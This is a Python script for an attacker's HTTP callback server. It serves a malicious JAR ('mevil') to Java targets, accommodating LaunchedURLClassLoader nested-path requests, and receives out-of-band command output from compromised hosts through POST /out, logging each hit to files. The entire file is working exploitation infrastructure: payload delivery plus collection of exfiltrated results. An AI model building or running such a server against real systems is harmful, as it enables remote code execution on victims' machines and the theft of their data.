#!/usr/bin/env python3
"""HTTP callback server — serve exploit JAR + receive OOB command output."""
import http.server, sys, json, os
from datetime import datetime

BIND, PORT = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0", int(sys.argv[2]) if len(sys.argv) > 2 else 18080
os.chdir(os.path.dirname(os.path.abspath(__file__)))
os.makedirs("logs", exist_ok=True)

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        if path == "/last":
            try:
                with open("logs/last.txt") as f:
                    self._ok(f.read().encode())
            except FileNotFoundError:
                self._404()
        elif path == "/health":
            self._ok(b"OK")
        elif os.path.isfile("www" + path):
            with open("www" + path, "rb") as f:
                self._ok(f.read(), "application/java-archive")
        elif "/mevil" in path:
            # LaunchedURLClassLoader may request nested/internal paths
            if os.path.isfile("www/mevil"):
                with open("www/mevil", "rb") as f:
                    self._ok(f.read(), "application/java-archive")
            else:
                self._404()
        else:
            self._404()

    def do_POST(self):
        if self.path == "/out":
            body = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode("utf-8", errors="replace")
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"\n[+] OOB /out @ {ts}\n{body}\n")
            with open("logs/last.txt", "w") as f: f.write(body)
            with open("logs/hits.jsonl", "a") as f: f.write(json.dumps({"time": ts, "output": body}) + "\n")
            self._ok(b"OK")
        else:
            self._404()

    def _ok(self, data=b"OK", ct="text/plain"):
        self.send_response(200); self.send_header("Content-Type", ct); self.end_headers(); self.wfile.write(data)
    def _404(self): self.send_response(404); self.end_headers()

print(f"[*] Listening {BIND}:{PORT}  |  www/  |  POST /out")
http.server.HTTPServer((BIND, PORT), H).serve_forever()
